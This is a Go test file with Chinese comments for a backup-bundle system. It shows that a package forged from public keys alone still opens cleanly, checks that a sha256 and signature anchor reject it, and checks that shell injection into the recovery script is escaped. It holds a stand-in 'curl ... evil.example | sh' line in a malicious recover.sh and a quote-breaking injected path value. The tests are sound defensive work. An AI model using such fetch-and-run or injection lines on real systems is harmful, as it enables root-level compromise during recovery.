package backupbundle

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"crypto/rsa"
	"encoding/json"
	"strings"
	"testing"
	"time"

	"github.com/Helix2010/RN-Server/internal/backupcontainer"
)

// 这一条测的是整套方案的核心安全主张，而它**反直觉**：
//
// 容器本身只有保密性，没有真实性。RSA-OAEP 用的是**公钥**，而公钥不是秘密——
// 它的指纹就印在控制台上、印在 README-FIRST.txt 里。所以任何拿到桶写权限的人，
// 不需要任何私钥，就能从零封一个完整合法的包：两层 MAC 都通过、两把恢复私钥都
// 能解开、里面是他写的 recover.sh。而 recover.sh 恢复时必然以 root 跑，在平台最
// 脆弱的那一天、由两位持有人亲手执行。
//
// 设计对此是诚实的（§4.3），并给了两个锚点。这条测试先**证明伪造真的能做成**
// （否则后面的断言是空的），再证明两个锚点各自拦得住。
func TestAForgedPackageOpensCleanlyButFailsBothAnchors(t *testing.T) {
	holders := testHolders(t)
	real, realSigner := testInputWithSigner(t, holders)
	realSink := newSink()
	realPackages, err := Assemble(real, realSink)
	if err != nil {
		t.Fatal(err)
	}
	pair := backupcontainer.Pairs()[0]
	var genuine Package
	for _, pkg := range realPackages {
		if pkg.Pair == pair.Name {
			genuine = pkg
		}
	}

	// ---- 攻击者登场。他只有三把**公钥**，没有任何私钥 ----
	//
	// 他不会借道我们的 Assemble（那个只会渲染我们自己的模板）——他手搓一个 tar，
	// 里面放他写的 recover.sh，再用公开的公钥封两层。这就是全部所需。
	forgedBody, attackerFingerprint := forgePackage(t, holders, real, pair)

	byslot := map[string]*rsa.PrivateKey{}
	for _, h := range holders {
		byslot[h.slot] = h.key
	}

	// 1) 伪造的包**确实开得干干净净**：两层都解得开，MAC 全过。
	//    这正是「MAC 通过只说明没损坏、不说明没被替换」那句话的含义
	outer := openOuter(t, forgedBody, byslot[pair.Outer])
	if _, _, err := backupcontainer.Open(bytes.NewReader(outer[nameInner]), byslot[pair.Inner]); err != nil {
		t.Fatalf("伪造的包内层打不开——那攻击就不成立，这条测试失去意义: %v", err)
	}
	script := string(outer[nameRecoverSh])
	if !strings.Contains(script, forgeMarker) {
		t.Fatal("伪造的 recover.sh 没进到包里")
	}

	// 2) 锚点一：整包 sha256。落库的那个值和伪造包对不上。
	//    灾难主场景（打包机坏了）里数据库和控制台都还在，这条随时可用
	if sha256Hex(forgedBody) == genuine.SHA256 {
		t.Fatal("伪造的包和真包 sha256 一样？那第一个锚点不存在")
	}
	if !strings.Contains(genuine.ReadmeFirst, genuine.SHA256) {
		t.Fatal("README 里没印真包的 sha256，第一个锚点没法用")
	}

	// 3) 锚点二：打包机对内层的 Ed25519 签名。**这一条才挡得住连服务端一起
	//    被攻破的人**——攻击者没有签名私钥，只能自己造一把，而三位持有人纸上
	//    抄的是真的那一把的指纹
	genuineOuter := openOuter(t, realSink.packages[pair.Name].Bytes(), byslot[pair.Outer])
	if err := backupcontainer.VerifyPayload(realSigner,
		genuineOuter[nameInner], genuineOuter[nameInnerSig]); err != nil {
		t.Fatalf("真包的签名应当验得过: %v", err)
	}
	if err := backupcontainer.VerifyPayload(realSigner,
		outer[nameInner], outer[nameInnerSig]); err == nil {
		t.Fatal("用真的签名公钥竟然验过了伪造的包——第二个锚点是坏的")
	}

	// 4) 攻击者当然可以把自己的签名公钥指纹写进伪造包的 manifest。
	//    所以验签公钥**绝不能取自包内**——它来自数据库/控制台，以及三位持有人
	//    纸上抄的那一行。这里确认伪造包里的那个指纹确实和真的不一样，
	//    也就是说人工核对那一步能看出来
	if attackerFingerprint == real.BackupSigningFingerprint {
		t.Fatal("测试构造有误：伪造方应当用自己的签名公钥")
	}
}

const forgeMarker = "curl -s http://evil.example/x | sh"

// forgePackage 手搓一个完整合法的包，**只用公钥**。
//
// 它不借道 Assemble：那个只会渲染我们自己的模板。真攻击者要的正是放进自己的
// recover.sh，所以他自己拼 tar。返回伪造包的字节和他那把签名公钥的指纹。
func forgePackage(t *testing.T, holders []holder, real Input, pair backupcontainer.Pair) ([]byte, string) {
	t.Helper()
	_, attackerSigner, err := ed25519.GenerateKey(rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	attackerPub := attackerSigner.Public().(ed25519.PublicKey)
	fingerprint, err := backupcontainer.SigningFingerprint(attackerPub)
	if err != nil {
		t.Fatal(err)
	}
	byslot := map[string]*rsa.PublicKey{}
	for _, h := range holders {
		byslot[h.slot] = &h.key.PublicKey
	}

	sealFor := func(slot string, plain []byte, layer backupcontainer.Layer) []byte {
		var out bytes.Buffer
		meta := backupcontainer.Meta{Layer: layer, Seq: real.Seq, InstanceID: real.InstanceID}
		if err := backupcontainer.Seal(&out, byslot[slot], meta,
			bytes.NewReader(plain), int64(len(plain))); err != nil {
			t.Fatal(err)
		}
		return out.Bytes()
	}

	innerPlain, err := TarFiles(map[string][]byte{"agent-key": []byte("not the real one")})
	if err != nil {
		t.Fatal(err)
	}
	inner := sealFor(pair.Inner, innerPlain, backupcontainer.LayerInner)
	server := sealFor(pair.Inner, innerPlain, backupcontainer.LayerInner)

	// 这一句就是攻击的全部目的：恢复时它以 root 跑
	malicious := "#!/bin/sh\n" + forgeMarker + "\necho ok\n"

	// manifest 照抄真包的形状，指纹都填成能自洽的值——攻击者当然会让它自洽
	manifest := outerManifest{
		Format: backupcontainer.Format, Seq: real.Seq, Pair: pair.Name,
		InstanceID: real.InstanceID, CreatedAt: real.CreatedAt.UTC().Format(time.RFC3339),
		ServerVersion: real.ServerVersion, AgentVersion: real.AgentVersion,
		AgentKeyFingerprint:      real.AgentKeyFingerprint,
		BackupSigningFingerprint: fingerprint,
		Tenants:                  real.Tenants, Recipients: real.Recipients,
		Files: []FileEntry{
			{Path: nameInner, Size: int64(len(inner)), SHA256: sha256Hex(inner)},
			{Path: nameServer, Size: int64(len(server)), SHA256: sha256Hex(server)},
			{Path: nameRecoverSh, Size: int64(len(malicious)), SHA256: sha256Hex([]byte(malicious))},
		},
	}
	encoded, err := marshalIndent(manifest)
	if err != nil {
		t.Fatal(err)
	}
	outerPlain, err := TarFiles(map[string][]byte{
		nameManifest:  encoded,
		nameRecovery:  []byte("# 照着做就行（其实不行）\n"),
		nameRecoverSh: []byte(malicious),
		nameInner:     inner,
		nameInnerSig:  backupcontainer.SignPayload(attackerSigner, inner),
		nameServer:    server,
	})
	if err != nil {
		t.Fatal(err)
	}
	return sealFor(pair.Outer, outerPlain, backupcontainer.LayerOuter), fingerprint
}

// 渲染器不能让攻击者把命令注进 recover.sh。
//
// 上面那条测试证明了「整包伪造」拦不住（只能靠锚点），但**注入是另一回事**：
// 一个只能改元数据、改不了整个包的攻击者，不该有办法让脚本执行别的东西。
func TestForgedMetadataCannotInjectIntoTheRecoverScript(t *testing.T) {
	holders := testHolders(t)
	in := testInput(t, holders)
	in.AgentManifest = append(in.AgentManifest, FileEntry{
		Path: "keystores/acme/keystore.p12", Size: 1, SHA256: strings.Repeat("0", 64),
		Target: "/var/lib/x'; " + forgeMarker + " #", Mode: "0600", Owner: "builder:builder",
	})
	script := renderRecoverScript(in, backupcontainer.Pairs()[0])

	// 恶意内容必须整段被单引号包住，不能在引号外面出现
	for _, line := range strings.Split(script, "\n") {
		if !strings.Contains(line, forgeMarker) {
			continue
		}
		trimmed := strings.TrimSpace(line)
		if !strings.HasPrefix(trimmed, "place ") {
			t.Fatalf("恶意内容出现在了一个不是 place 调用的地方: %s", trimmed)
		}
		// place "$ROOT/..." '<target>' '<mode>' '<owner>' ——恶意内容必须在
		// 第三个参数的单引号里，而且里面的单引号被转义成 '\''
		if !strings.Contains(line, `'\''`) {
			t.Fatalf("路径里的单引号没有被转义，脚本会断开: %s", line)
		}
	}
}

// marshalIndent 只有这里的伪造测试用：攻击者造 manifest 时要和真包一样的缩进，
// 好让人工比对看不出差别。生产代码不需要它
func marshalIndent(value any) ([]byte, error) { return json.MarshalIndent(value, "", "  ") }
